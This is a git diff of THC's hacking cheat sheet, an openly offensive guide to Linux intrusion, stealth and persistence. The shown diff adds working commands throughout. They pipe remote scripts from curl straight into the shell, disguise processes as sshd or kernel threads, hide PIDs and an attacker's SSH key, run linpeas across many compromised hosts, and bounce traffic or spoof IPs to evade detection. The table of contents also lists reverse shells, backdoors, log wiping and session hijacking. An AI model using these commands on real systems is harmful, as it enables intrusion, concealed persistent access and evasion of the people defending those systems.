@@ -1,54 +1,67 @@
 <!-- Use `grip 8080` to render the markdown locally -->
 # THC's favourite Tips, Tricks & Hacks (Cheat Sheet)
 
-https://tinyurl.com/thctips
+https://thc.org/tips  
 
 A collection of our favourite tricks. Many of those tricks are not from us. We merely collect them.
 
 We show the tricks 'as is' without any explanation why they work. You need to know Linux to understand how and why they work.
 
-Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
+Got tricks? Join us [https://thc.org/ops](https://thc.org/ops)
 
 1. [Bash](#bash)
-   1. [Leave Bash without history](#bash-no-history)
+   1. [Set up a Hack Shell](#hackshell)
    1. [Hide your commands](#bash-hide-command)
-   1. [Hide your arguments](#bash-hide-arguments)
+   1. [Hide your command line options](#zap)
    1. [Hide a network connection](#bash-hide-connection)
    1. [Hide a process as user](#hide-a-process-user)
    1. [Hide a process as root](#hide-a-process-root)
    1. [Hide scripts](#hide-scripts)
    1. [Hide from cat](#cat)
+   1. [Execute in parallel with separate logfiles](#parallel)
 1. [SSH](#ssh)
    1. [Almost invisible SSH](#ssh-invisible)
+   1. [Multiple shells via 1 SSH/TCP connection](#ssh-master)
    1. [SSH tunnel](#ssh-tunnel)
    1. [SSH socks5 tunnel](#ssh-socks-tunnel)
    1. [SSH to NATed host](#ssh-j)
    1. [SSH pivot via ProxyJump](#ssh-pj)
+   1. [SSHD as user](#sshd-user)
 1. [Network](#network)
    1. [Discover hosts](#discover)
    1. [Tcpdump](#tcpdump)
    1. [Tunnel and forwarding](#tunnel)
+      1. [Raw TCP reverse ports](#ports)
+      1. [HTTPS reverse forwards](#https)
+      2. [Bouncing traffic with iptables](#iptables)
+      3. [Ghost IP / IP Spoofing](#ghost)
+      4. [Various](#tunnel-more)
    1. [Use any tool via Socks Proxy](#scan-proxy)
    1. [Find your public IP address](#your-ip)
    1. [Check reachability from around the world](#check-reachable)
    1. [Check/Scan Open Ports](#check-open-ports)
    1. [Crack Passwords hashes](#bruteforce)
-   1. [Brute Force Passwords](#bruteforce)
+   1. [Brute Force Passwords / Keys](#bruteforce)
 1. [Data Upload/Download/Exfil](#exfil)
    1. [File Encoding/Decoding](#file-encoding)
    1. [File transfer using cut & paste](#cut-paste)
    1. [File transfer using screen](#file-transfer-screen)
    1. [File transfer using gs-netcat and sftp](#file-transfer-gs-netcat)
    1. [File transfer using HTTP](#http)
-   1. [File transfer without curl](#burl)
+   1. [File download without curl](#download)
+   2. [File transfer using rsync](#rsync)
+   1. [File transfer to public dump sites](#trans) 
    1. [File transfer using WebDAV](#webdav)
    1. [File transfer to Telegram](#tg) 
 1. [Reverse Shell / Dumb Shell](#reverse-shell)
    1. [Reverse Shells](#reverse-shell)
-      1. [with gs-netcat](#reverse-shell-gs-netcat)
+      1. [with gs-netcat (encrypted)](#reverse-shell-gs-netcat)
       1. [with Bash](#reverse-shell-bash)
-      1. [without Bash](#reverse-shell-no-bash)
-      1. [with remote.moe](#revese-shell-remote-moe)
+      2. [with cURL (encrypted)](#curlshell)
+      2. [with cURL (cleartext)](#curltelnet)
+      3. [with OpenSSL (encrypted)](#sslshell)
+      1. [with remote.moe (encrypted)](#revese-shell-remote-moe)
+      1. [without /dev/tcp](#reverse-shell-no-bash)
       1. [with Python](#reverse-shell-python)
       1. [with Perl](#reverse-shell-perl)
       1. [with PHP](#reverse-shell-php)
@@ -60,25 +73,33 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Background reverse shell](#backdoor-background-reverse-shell)
    1. [authorized_keys](#backdoor-auth-keys)
    1. [Remote access an entire network](#backdoor-network)
-   1. [Smallest PHP backdoor](#carriage-return-backdoor) 
+   1. [Smallest PHP backdoor](#php-backdoor) 
    1. [Local Root backdoor](#ld-backdoor)
+   1. [Self-extracting implant](#implant)
+1. [Host Recon](#hostrecon)
 1. [Shell Hacks](#shell-hacks)
    1. [Shred files (secure delete)](#shred)
    1. [Restore the date of a file](#restore-timestamp)
    1. [Clean logfile](#shell-clean-logs)
    1. [Hide files from a User without root privileges](#shell-hide-files)
-   1. [Find out Linux Distro](#linux-info)
+   1. [Make a file immutable](#perm-files)
+   1. [Change user without sudo/su](#nosudo)
+   1. [Obfuscate and crypt payload](#payload)
+   1. [Deploying a backdoor without touching the file-system](#memexec)
 1. [Crypto](#crypto)
    1. [Generate quick random Password](#gen-password)
    1. [Linux transportable encrypted filesystems](#crypto-filesystem)
       1. [cryptsetup](#crypto-filesystem)
       1. [EncFS](#encfs)
    1. [Encrypting a file](#encrypting-file)
-1. [Sniffing a user's SSH session](#ssh-sniffing)
-   1. [with strace](#ssh-sniffing-strace)
-   1. [with script](#ssh-sniffing-script)
-   1. [with a wrapper script](#ssh-sniffing-wrapper)
-   1. [with SSH-IT](#ssh-sniffing-sshit)
+1. [Session sniffing and hijacking](#sniffing)
+   1. [Sniff a user's SHELL session](#session-sniffing)
+   2. [Sniff all SHELL sessions with dtrace](#dtrace)
+   2. [Sniff all SHELL sessions with eBPF](#bpf)
+   1. [Sniff a user's SSH or SSHD session with strace](#ssh-sniffing-strace)
+   1. [Sniff a user's outgoing SSH session with a wrapper script](#ssh-sniffing-wrapper)
+   1. [Sniff a user's outgoing SSH session with SSH-IT](#ssh-sniffing-sshit)
+   1. [Hijack / Take-over a running SSH session](#hijack)
 1. [VPN and Shells](#vpn-shell)
    1. [Disposable Root Servers](#shell)
    1. [VPN/VPS Providers](#vpn)
@@ -86,32 +107,64 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
 1. [Miscellaneous](#misc)
    1. [Tools of the trade](#tools)
    1. [Cool Linux commands](#cool-linux-commands)
-   1. [tmux](#tmux)
+   1. [tmux Cheat Sheet](#tmux)
    1. [Useful commands](#useful-commands)
+1. [How to become a Hacker](#hacker)
 1. [Other Sites](#others)
-    
-   
 
 ---
 <a id="bash"></a>
 ## 1. Bash / Shell
-<a id="bash-no-history"></a>
-**1.i. Leave Bash without history:**
+<a id="hackshell"></a>
+**1.i. Set up a Hack Shell (bash):**
 
-Tell Bash to use */dev/null* instead of *~/.bash_history*. This is the first command we execute on every shell. It will stop the Bash from logging your commands. 
-
+Make BASH less noisy. Disables *~/.bash_history* and [many other things](https://github.com/hackerschoice/hackshell).
 ```sh
-export HISTFILE=/dev/null
-unset SSH_CONNECTION SSH_CLIENT
+ source <(curl -SsfL https://thc.org/hs)
+```
+Alternative URL:
+```sh
+ source <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)
 ```
 
-(We also clear SSH_* variables in case we logged in with SSH. Otherwise any process we start gets a copy of our IP in /proc/self/environ.)
-
-It is good housekeeping to 'commit suicide' when exiting a shell:
+And if there is no curl/wget, use [surl](#download) and (temporarily) installed curl with `bin curl`.
 ```sh
-alias exit='kill -9 $$'
+source <(surl https://raw.githubusercontent.com/hackerschoice/hackshell/main/hackshell.sh)
+# Afterwards type `bin curl` to (temporarily) install curl (in memory).
 ```
 
+HackShell does much more but most importantly this:
+```sh
+unset HISTFILE
+[ -n "$BASH" ] && export HISTFILE="/dev/null"
+export BASH_HISTORY="/dev/null"
+export LANG=en_US.UTF-8
+locale -a 2>/dev/null|grep -Fqim1 en_US.UTF || export LANG=en_US
+export LESSHISTFILE=-
+export REDISCLI_HISTFILE=/dev/null
+export MYSQL_HISTFILE=/dev/null
+TMPDIR="/tmp"
+[ -d "/var/tmp" ] && TMPDIR="/var/tmp"
+[ -d "/dev/shm" ] && TMPDIR="/dev/shm"
+export TMPDIR
+export PATH=".:${PATH}"
+if [[ "$SHELL" == *"zsh" ]]; then
+    PS1='%F{red}%n%f@%F{cyan}%m %F{magenta}%~ %(?.%F{green}.%F{red})%#%f '
+else
+    PS1='\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]\$ '
+fi
+alias wget='wget --no-hsts'
+alias vi="vi -i NONE"
+alias vim="vim -i NONE"
+alias screen="screen -ln"
+
+TERM=xterm reset -I
+stty cols 400 # paste this on its own before pasting the next line:
+resize &>/dev/null || { stty -echo;printf "\e[18t"; read -t5 -rdt R;IFS=';' read -r -a a <<< "${R:-8;25;80}";[ "${a[1]}" -ge "${a[2]}" ] && { R="${a[1]}";a[1]="${a[2]}";a[2]="${R}";};stty sane rows "${a[1]}" cols "${a[2]}";}
+# stty sane rows 60 cols 160
+```
+
+Bonus tip:
 Any command starting with a " " (space) will [not get logged to history](https://unix.stackexchange.com/questions/115917/why-is-bash-not-storing-commands-that-start-with-spaces) either.
 ```
 $  id
@@ -120,43 +173,56 @@ $  id
 <a id="bash-hide-command"></a>
 **1.ii. Hide your command / Daemonzie your command**
 
-Hide as "syslogd".
+This will hide the *process name* only. Use [zapper](#zap) to also hide the command line options.
 
 ```shell
-(exec -a syslogd nmap -T0 10.0.2.1/24) # Note the brackets '(' and ')'
+(exec -a syslogd nmap -Pn -F -n --open -oG - 10.0.2.1/24) # Note the brackets '(' and ')'
 ```
 
-Start a background hidden process:
+Start a background 'nmap' hidden as '/usr/sbin/sshd':
 ```
-(exec -a syslogd nmap -T0 10.0.2.1/24 &>nmap.log &)
+(exec -a '/usr/sbin/sshd' nmap -Pn -F -n --open -oG - 10.0.2.1/24 &>nmap.log &)
 ```
 
 Start within a [GNU screen](https://linux.die.net/man/1/screen):
 ```
-screen -dmS MyName nmap -T0 10.0.2.1/24
+screen -dmS MyName nmap -Pn -F -n --open -oG - 10.0.2.1/24
 ### Attach back to the nmap process
 screen -x MyName
 ```
 
-Alternatively if there is no Bash:
+Alternatively, copy the binary to a new name:
 ```sh
-cp `which nmap` syslogd
-PATH=.:$PATH syslogd -T0 10.0.2.1/24
+cd /dev/shm
+cp "$(command -v nmap)" syslogd
+PATH=.:$PATH syslogd -Pn -F -n --open -oG - 10.0.2.1/24
 ```
-In this example we execute *nmap* but let it appear with the name *syslogd* in *ps alxwww* process list.
 
-<a id="bash-hide-arguments"></a>
-**1.iii. Hide your arguments**
+or use bind-mount to (temporarily) let */sbin/init* point to */dev/shm/nmap* instead:
+```shell
+mount -n --bind "$(command -v nmap)" /sbin/init
+# starting /sbin/init will instead execute nmap
+(/sbin/init -Pn -f -n --open -oG - 10.0.2.1/24 &>nmap.log &)
+```
 
-Download [zap-args.c](https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/src/zap-args.c). This example will execute *nmap* but will make it appear as 'syslogd' without any arguments in the *ps alxww* output.
+<a id="zap"></a>
+**1.iii. Hide your command line options**
+
+Use [zapper](https://github.com/hackerschoice/zapper):
+```sh
+curl -fL -o zapper https://github.com/hackerschoice/zapper/releases/latest/download/zapper-linux-$(uname -m) && \
+chmod 755 zapper
+```
 
 ```sh
-gcc -Wall -O2 -fpic -shared -o zap-args.so zap-args.c -ldl
-(LD_PRELOAD=./zap-args.so exec -a syslogd nmap -T0 10.0.0.1/24)
-### Or as daemon background process:
-(LD_PRELOAD=./zap-args.so exec -a syslogd nmap -T0 10.0.0.1/24 &>nmap.log &)
+# Start Nmap but zap all options and show it as 'klog' in the process list:
+./zapper -a klog nmap -Pn -F -n --open -oG - 10.0.0.1/24
+# Started as a daemon and sshd-style name:
+(./zapper -a 'sshd: root@pts/0' nmap -Pn -F -n --open -oG - 10.0.0.1/24 &>nmap.log &)
+# Replace the existing shell with tmux (with 'exec').
+# Then start and hide tmux and all further processes - as some kernel process:
+exec ./zapper -f -a'[kworker/1:0-rcu_gp]' tmux
 ```
-Note: There is a gdb variant as well. Anyone?
 
 <a id="bash-hide-connection"></a>
 **1.iv. Hide a Network Connection**
@@ -211,8 +277,7 @@ echo 'ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >>~/.ba
 
 This requires root privileges and is an old Linux trick by over-mounting /proc/&lt;pid&gt; with a useless directory:
 ```sh
-hide()
-{
+hide() {
     [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }
     _pid=${1:-$$}
     [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo "[THC] PID $_pid is now hidden"; return; }
@@ -267,9 +332,27 @@ Note: We use `echo -e` to convert `\\033` to the ANSI escape character (hex 0x1b
 Adding a `\r` (carriage return) goes a long way to hide your ssh key from `cat`:
 ```shell
 echo "ssh-ed25519 AAAAOurPublicKeyHere....blah x@y"$'\r'"$(<authorized_keys)" >authorized_keys
-### This adds our key as the first key and 'cat authorized_keys' wont show
+### This adds our key as the first key and 'cat authorized_keys' won't show
 ### it. The $'\r' is a bash special to create a \r (carriage return).
 ```
+
+<a id="parallel"></a>
+**1.ix. Execute in parallel with separate logfiles***
+
+Scan 20 hosts in parallel and log each result to a separate log file:
+```sh
+# hosts.txt contains a long list of hostnames or ip-addresses
+# (Use -sCV for more verbose version)
+cat hosts.txt | parallel -j20 'exec nmap -n -Pn -sV -F --open -oG - {} >nmap_{}.txt'
+```
+Note: The example uses `exec` to replace the underlying shell with the last process (nmap, gsexec). It's optional but reduces the number of running shell binaries.
+
+Execute [Linpeas](https://github.com/carlospolop/PEASS-ng) on all [gsocket](https://www.gsocket.io/deploy) hosts using 40 workers:
+```sh
+# secrets.txt contains a long list of gsocket-secrets for each remote server.
+cat secrets.txt | parallel -j40 'mkdir host_{}; exec gsexec {} "curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" >host_{}/linpeas.log 2>host_{}/linpeas.err'
+```
+Note: `xargs -P20 -I{}` is another good way but it cannot log each output into a separate file.  
 
 ---
 <a id="ssh"></a>
@@ -282,28 +365,45 @@ Stops you from showing up in *w* or *who* command and stops logging the host to 
 ssh -o UserKnownHostsFile=/dev/null -T user@server.org "bash -i"
 ```
 
-Go full comfort with PTY and colors: `thcssh user@server.org`:
+Go full comfort with PTY and colors: `xssh user@server.org`:
 
 ```sh
 ### Cut & Paste the following to your shell, then execute
-### thcssh user@server.org
-thcssh()
-{
-    local ttyp
+### xssh user@server.org
+xssh() {
+    local ttyp="$(stty -g)"
     echo -e "\e[0;35mTHC says: pimp up your prompt: Cut & Paste the following into your remote shell:\e[0;36m"
-    echo -e 'PS1="{THC} \[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w\[\\033[m\]\\$ "\e[0m'
-    ttyp=$(stty -g)
-    stty raw -echo opost
+    echo -e '\e[0;36msource <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)\e[0m'
+    echo -e "\e[2m# or: \e[0;36m\e[2mPS1='"'\[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w\[\\033[m\]\\$ '"'\e[0m"
+    stty raw -echo icrnl opost
     [[ $(ssh -V 2>&1) == OpenSSH_[67]* ]] && a="no"
-    ssh -o UpdateHostKeys=no -o StrictHostKeyChecking="${a:-accept-new}" -T \
+    ssh -oConnectTimeout=5 -oUserKnownHostsFile=/dev/null -oStrictHostKeyChecking="${a:-accept-new}" -T \
         "$@" \
-        "unset SSH_CLIENT SSH_CONNECTION; TERM=xterm-256color BASH_HISTORY=/dev/null exec -a [ntp] script -qc 'exec -a [uid] /bin/bash -i' /dev/null"
+        "unset SSH_CLIENT SSH_CONNECTION; LESSHISTFILE=- MYSQL_HISTFILE=/dev/null TERM=xterm-256color HISTFILE=/dev/null BASH_HISTORY=/dev/null exec -a [uid] script -qc 'source <(resize 2>/dev/null); exec -a [uid] bash -i' /dev/null"
     stty "${ttyp}"
 }
 ```
 
+<a id="ssh-master"></a>
+**2.ii Multiple shells via 1 SSH/TCP connection**
+
+Have one TCP connection to the target and allow multiple users to piggyback on the same TCP connection to open further shell sessions.
+
+Create a Master Connection:
+```sh
+ssh -M -S .sshmux user@server.org
+```
+
+Create further shell-sessions using the same (single) Master-TCP connection from above (no password/auth needed):
+```sh
+ssh -S .sshmux NONE
+#ssh -S .sshmux NONE ls -al
+#scp -o "ControlPath=.sshmux" NONE:/etc/passwd .
+```
+Can be combined with [xssh](#ssh-invisible) to hide from utmp.
+
 <a id="ssh-tunnel"></a>
-**2.ii SSH tunnel**
+**2.iii SSH tunnel**
 
 We use this all the time to circumvent local firewalls and IP filtering:
 ```sh
@@ -320,7 +420,7 @@ ssh -o ExitOnForwardFailure=yes -g -R31338:192.168.0.5:80 user@server.org
 Anyone connecting to server.org:31338 will get tunneled to 192.168.0.5 on port 80 via your computer. An alternative and without the need for a server is to use [gs-netcat](#backdoor-network).
 
 <a id="ssh-socks-tunnel"></a>
-**2.iii SSH socks4/5 tunnel**
+**2.iv SSH socks4/5 tunnel**
 
 OpenSSH 7.6 adds socks support for dynamic forwarding. Example: Tunnel all your browser traffic through your server.
 
@@ -338,26 +438,26 @@ ssh -g -R 1080 user@server.org
 The others configuring server.org:1080 as their SOCKS4/5 proxy. They can now connect to *any* computer on *any port* that your computer has access to. This includes access to computers behind your firewall that are on your local network. An alternative and without the need for a server is to use [gs-netcat](#backdoor-network).
 
 <a id="ssh-j"></a>
-**2.iv SSH to a host behind NAT**
+**2.v SSH to a host behind NAT**
 
 [ssh-j.com](http://ssh-j.com) provides a great relay service: To access a host behind NAT/Firewall (via SSH).
 
 On the host behind NAT: Create a reverse SSH tunnel to [ssh-j.com](http://ssh-j.com) like so:
 ```sh
 ## Cut & Paste on the host behind NAT.
-ssh_j()
+sshj()
 {
    local pw
-   pw=$1
+   pw=${1,,}
    [[ -z $pw ]] && { pw=$(head -c64 </dev/urandom | base64 | tr -d -c a-z0-9); pw=${pw:0:12}; }
    echo "Press Ctrl-C to stop this tunnel."
-   echo -e "To connect to this host: \e[0;36mssh -J ${pw}@ssh-j.com ${USER:-root}@${pw}\e[0m"
+   echo -e "To ssh to ${USER:-root}@${2:-127.0.0.1}:${3:-22} type: \e[0;36mssh -J ${pw}@ssh-j.com ${USER:-root}@${pw}\e[0m"
    ssh -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=30 -o ExitOnForwardFailure=yes ${pw}@ssh-j.com -N -R ${pw}:22:${2:-0}:${3:-22}
 }
 
-ssh_j                                 # Generates a random tunnel ID [e.g. 5dmxf27tl4kx] and keeps the tunnel connected
-ssh_j foobarblahblub                  # Creates tunnel with specific tunnel ID
-ssh_j foobarblahblub 192.168.0.1 2222 # Tunnel to host 192.168.0.1 on port 2222 on the LAN
+sshj                                 # Generates a random tunnel ID [e.g. 5dmxf27tl4kx] and keeps the tunnel connected
+sshj foobarblahblub                  # Creates tunnel to 127.0.0.1:22 with specific tunnel ID
+sshj foobarblahblub 192.168.0.1 2222 # Tunnel to host 192.168.0.1:2222 on the LAN
 ```
 
 Then use this command from anywhere else in the world to connect as 'root' to 'foobarblahblub' (the host behind the NAT):
@@ -368,7 +468,7 @@ The ssh connection goes via ssh-j.com into the reverse tunnel to the host behind
 
 
 <a id="ssh-pj"></a>
-**2.v SSH pivoting to multiple servers**
+**2.vi SSH pivoting to multiple servers**
 
 SSH ProxyJump can save you a lot of time and hassle when working with remote servers. Let's assume the scenario:  
 
@@ -394,6 +494,27 @@ kali@local-kali$ ssh -J c2@10.25.237.119 jumpuser@192.168.5.135
 
 > We use this as well to hide our IP address when logging into servers. 
 
+<a id="sshd-user"></a>
+**2.vii SSHD as user land**
+
+It is possible to start a SSHD server as a non-root user and use this to multiplex or forward TCP connection (without logging and when the systemwide SSHD forbids forwarding/multiplexing) or as a quick exfil-dump-server that runs as non-root:
+```sh
+# On the server, as non-root user 'joe':
+mkdir -p ~/.ssh 2>/dev/null
+ssh-keygen -q -N "" -t ed25519 -f sshd_key
+cat sshd_key.pub >>~/.ssh/authorized_keys
+cat sshd_key
+$(command -v sshd) -f /dev/null -o HostKey=$(pwd)/sshd_key -o GatewayPorts=yes -p 31337 # -Dvvv
+```
+```sh
+# On the client, copy the sshd_key from the server. Then login:
+# Example: Proxy connection via the server and reverse-forward 31339 to localhost:
+ssh -D1080 -R31339:0:31339 -i sshd_key -p 31337 joe@1.2.3.4
+# curl -x socks5h://0 ipinfo.io
+```
+
+[SSF](https://securesocketfunneling.github.io/ssf/#home) is an alternative way to multiplex TCP over TLS.
+
 ---
 <a id="network"></a>
 ## 3. Network
@@ -401,30 +522,37 @@ kali@local-kali$ ssh -J c2@10.25.237.119 jumpuser@192.168.5.135
 **3.i. Discover hosts**
 
 ```sh
-## ARP disocer computers on the local network
-nmap -r -sn -PR 192.168.0.1/24
+## ARP discover computers on the _LOCAL_ network only
+nmap -n -sn -PR -oG - 192.168.0.1/24
 ```
 
 ```sh
-## ICMP discover computers on the local netowrk
-NET="10.11.0"  # discover 10.11.0.1-10.11.0.254
+### ICMP discover hosts
+nmap -n -sn -PI -oG - 192.168.0.1/24
+```
+
+```sh
+## ICMP discover hosts (local LAN) ROOT
+# NET="10.11.0"  # discover 10.11.0.1-10.11.0.254
 seq 1 254 | xargs -P20 -I{} ping -n -c3 -i0.2 -w1 -W200 "${NET:-192.168.0}.{}" | grep 'bytes from' | awk '{print $4" "$7;}' | sort -uV -k1,1
 ```
 
+---
 <a id="tcpdump"></a>
 **3.ii. tcpdump**
 
 ```sh
 ## Monitor every new TCP connection
-tcpdump -n "tcp[tcpflags] == tcp-syn"
+tcpdump -np 'tcp[tcpflags] ^ (tcp-syn|tcp-ack) == 0'
 
 ## Play a *bing*-noise for every new SSH connection
-tcpdump -nlq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo -en \\a; done
+tcpdump -nplq 'tcp[13] == 2 and dst port 22' | while read -r x; do echo "${x}"; echo -en \\a; done
 
 ## Ascii output (for all large packets. Change to >40 if no TCP options are used).
-tcpdump -s 2048 -nAq 'tcp and (ip[2:2] > 60)'
+tcpdump -npAq -s0 'tcp and (ip[2:2] > 60)'
 ```
 
+---
 <a id="tunnel"></a>
 **3.iii. Tunnel and forwarding**
 
@@ -441,41 +569,81 @@ openssl s_client -connect smtp.gmail.com:465
 socat TCP-LISTEN:25,reuseaddr,fork  openssl-connect:smtp.gmail.com:465
 ```
 
-<a id="https"></a>
-**3.iii.b. HTTPS reverse tunnels**
+---
+<a id="ports"></a>
+**3.iii.a Raw TCP reverse ports**
 
-On the server:  
+Useful for reverse backdoors that need a TCP Port on a PUBLIC IP Address:
+
+Using [segfault.net](https://thc.org/segfault.net) (free):
 ```sh
-### Reverse HTTPS tunnel to forward public HTTPS requests to Port 8080 on this server:
+# Request a random public TCP port:
+curl sf/port
+echo "Your public IP:PORT is $(cat /config/self/reverse_ip):$(cat /config/self/reverse_port)"
+nc -vnlp $(cat /config/self/reverse_port)
+```
+
+Using [bore.pub](https://github.com/ekzhang/bore) (free):
+```sh
+# Forward a random public TCP port to localhost:31337
+bore local 31337 --to bore.pub
+```
+
+using [serveo.net](https://serveo.net) (free):
+```sh
+# Forward a random public TCP port to localhost:31337
+ssh -R 0:localhost:31337 serveo.net
+```
+
+See also [remote.moe](#revese-shell-remote-moe) (free) to forward raw TCP from the target to your workstation or [playit](https://playit.gg/) (free) or [ngrok](https://ngrok.com/) (paid subscription) to forward a raw public TCP port.
+
+Other free services are limited to forward HTTPS only (not raw TCP). Some tricks below show how to tunnel raw TCP over HTTPS forwards (using websockets).
+
+---
+<a id="https"></a>
+**3.iii.b HTTPS reverse tunnels**
+
+On the server, use any one of these three HTTPS tunneling services:  
+```sh
+### Reverse HTTPS tunnel to forward public HTTPS requests to this server's port 8080:
 ssh -R80:0:8080 -o StrictHostKeyChecking=accept-new nokey@localhost.run
 ### Or using remote.moe
 ssh -R80:0:8080 -o StrictHostKeyChecking=accept-new nokey@remote.moe
 ### Or using cloudflared
+curl -fL -o cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
+chmod 755 cloudflared
 cloudflared tunnel --url http://localhost:8080 --no-autoupdate
 ```
-Either tunnel will generate a new HTTPS-URL for you. Use this URL on your workstation (see below). Use [Gost](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service) to tunnel raw TCP over the HTTP(s) link.
+Either service will generate a new temporary HTTPS-URL for you to use.  
 
-A simple STDIN/STDOUT pipe via HTTPS:
+Then, use [websocat](https://github.com/vi/websocat) or [Gost](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service) on both ends to tunnel raw TCP over the HTTPS URL:
+
+A. A simple STDIN/STDOUT pipe via HTTPS:
 ```sh
+### On the server convert WebSocket to raw TCP:
 websocat -s 8080
-### and on the workstation use this command to connect:
+```
+```sh
+### On the remote target forward stdin/stdout to WebSocket:
 websocat wss://<HTTPS-URL>
 ```
 
-Or run a Socks-Proxy (via HTTPS):
+B. Forward raw TCP via HTTPS:
 ```sh
-### On the server
+### On the server: Gost will translate any HTTP-websocket request to a TCP socks5 request:
 gost -L mws://:8080
 ```
 
-On the workstation:  
-
 Forward port 2222 to the server's port 22.
 ```sh
+### On the workstation:
 gost -L tcp://:2222/127.0.0.1:22 -F 'mwss://<HTTPS-URL>:443'
+### Test the connection (will connect to localhost:22 on the server)
+nc -vn 127.0.0.1 2222
 ```
-or use it as a Socks-Proxy:
+or use the server as a Socks-Proxy EXIT node (e.g. access any host inside the server's network or even the Internet via the server (using the HTTPS reverse tunnel from above):
 ```sh
+### On the workstation:
 gost -L :1080 -F 'mwss://<HTTPS-URL>:443'
 ### Test the Socks-proxy:
 curl -x socks5h://0 ipinfo.io
@@ -483,9 +651,80 @@ curl -x socks5h://0 ipinfo.io
 
 More: [https://github.com/twelvesec/port-forwarding](https://github.com/twelvesec/port-forwarding) and [Tunnel via Cloudflare to any TCP Service](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service) and [Awesome Tunneling](https://github.com/anderspitman/awesome-tunneling).
 
+---
+<a id="iptables"></a>
+**3.iii.c Bouncing traffic with iptables**
+
+Bounce through a host/router without needing to run a userland proxy or forwarder:
+```sh
+ipfwinit() {
+    echo 1 >/proc/sys/net/ipv4/ip_forward
+    echo 1 >/proc/sys/net/ipv4/conf/all/route_localnet
+    [ $# -le 0 ] && set -- "0.0.0.0/0"
+    while [ $# -gt 0 ]; do
+        iptables -t mangle -I PREROUTING -s "${1}" -p tcp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188 
+        shift 1
+    done
+    iptables -t mangle -D PREROUTING -j CONNMARK --restore-mark >/dev/null 2>/dev/null
+    iptables -t mangle -I PREROUTING -j CONNMARK --restore-mark
+    iptables -I FORWARD -m mark --mark 1188 -j ACCEPT
+    iptables -t nat -I POSTROUTING -m mark --mark 1188 -j MASQUERADE
+    iptables -t nat -I POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark
+}
+ipfw() {
+    iptables -t nat -A PREROUTING -p tcp --dport "${1:?}" -m mark --mark 1188 -j DNAT --to ${2:?}:${3:?}
+}
+ipfwinit                             # Allow EVERY IP to bounce
+# ipfwinit "1.2.3.4/16" "6.6.0.0/16" # Only allow these SOURCE IP's to bounce
+```
+
+Then set forwards like so:
+```sh
+ipfw 31337 144.76.220.20 22 # Bounce 31337 to segfault's ssh port.
+ipfw 31338 127.0.0.1 8080   # Bounce 31338 to the server's 8080 (localhost)
+ipfw 53 213.171.212.212 443 # Bounce 53 to gsrn-relay on port 443
+```
+
+We use this trick to reach the gsocket-relay-network (or TOR) from deep inside firewalled networks.
+```sh
+# Deploy on a target that can only reach 192.168.0.100  
+GS_HOST=192.168.0.100 GS_PORT=53 ./deploy.sh  
+```
+```sh
+# Access the target  
+GS_HOST=213.171.212.212 gs-netcat -i -s ...
+```
+
+---
+<a id="ghost"></a>
+**3.vi.c Ghost IP / IP Spoofing**
+
+Useful on a host inside the target network. This tool re-configured (without trace) the SHELL: Any program (nmap, cme, ...) started from this SHELL will use a fake IP. All your attacks will originate from a host that does not exist.
+
+```sh
+source <(curl -fsSL https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/ghostip.sh)
+```
+
+This also works in combination with:
+ * [Segfault's ROOT Servers](https://thc.org/segfault/wireguard): Will connect your ROOT Server to the TARGET NETWORK and using a Ghost IP inside the target network.
+ * [QEMU Tunnels](https://securelist.com/network-tunneling-with-qemu/111803/): As above, but less secure.
+
+---
+<a id="tunnel-more"></a>
+**3.vi.d Various Tunnel Tricks**
+
+### Tunnel via CDN
+ * Read [How to tunnel any TCP service via CloudFlare](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service) or use [DarkFlare](https://github.com/doxx/darkflare).
+
+### Connect your host directly to the remote network
+ * [WireTap](https://github.com/sandialabs/wiretap) - Works as user or root. Uses UDP as transport. ([Try it](https://thc.org/segfault/wireguard) on segfault.)
+ * [ligolo-ng](https://github.com/nicocha30/ligolo-ng) - Uses TCP as transport. Works well via [cloudflare CDN](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service) or gs-netcat.
+
+---
 <a id="scan-proxy"></a>
 **3.iv. Use any tool via Socks Proxy**
 
+### Create a tunnel from the target to your workstation using gsocket:
 On the target's network:
 ```sh
 ## Create a SOCKS proxy into the target's network.
@@ -499,6 +738,7 @@ On your workstation:
 gs-netcat -p 1080
 ```
 
+### Using ProxyChain:
 ```sh
 ## Use ProxyChain to access any host on the target's network: 
 echo -e "[ProxyList]\nsocks5 127.0.0.1 1080" >pc.conf
@@ -509,6 +749,16 @@ proxychains -f pc.conf -q nmap -n -Pn -sV -F --open 192.168.1.1
 seq 1 254 | xargs -P10 -I{} proxychains -f pc.conf -q nmap -n -Pn -sV -F --open 192.168.1.{} 
 ```
 
+### Using GrafTCP:
+```sh
+## Use graftcp to access any host on the target's network:
+(graftcp-local -select_proxy_mode only_socks5 &)
+graftcp curl ipinfo.io
+graftcp ssh root@192.168.1.1
